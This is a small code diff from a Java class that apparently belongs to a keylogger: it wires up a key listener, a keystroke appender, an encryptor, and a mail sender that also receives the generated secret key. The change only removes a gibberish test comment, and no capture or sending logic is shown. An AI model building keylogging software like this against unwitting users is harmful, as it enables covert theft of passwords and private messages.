@@ -18,13 +18,13 @@ public class KeyTrackerService {
         ArgsResolver argsResolver = new ArgsResolver(args);
         MailSender mailSender = new MailSender();
         SecretKey secretKey = new SecretKeyStore(new KeyGen(), mailSender, argsResolver).secretKey();
-
         KeyAppender keyAppender = new KeyAppender();
+
         MechanismsFactory mechanismsFactory = new MechanismsFactoryImpl(argsResolver, mailSender);
         this.storeMechanisms = mechanismsFactory.getSingleStoreMechanisms(keyAppender, new Encryptor(secretKey));
 
         this.keyListener = new KeyListenerImpl(new AsciToStringKeyResolver(new HandlersProvider(new CharactersProvider())), keyAppender);
-    }// ok sprawdzam sosd feo ewo greo gkekd emskw fskwmf soekf eskw,d ejr eeeeeee zzzzzz aaaaa eeee wwww qqqq eeee rrrr tttt yyyy uuiiooooo ppqweeeee ttttt oksowodokwd ja je ja je ja jeeee
+    }
 
     public KeyListener getKeyListener() {
         return this.keyListener;
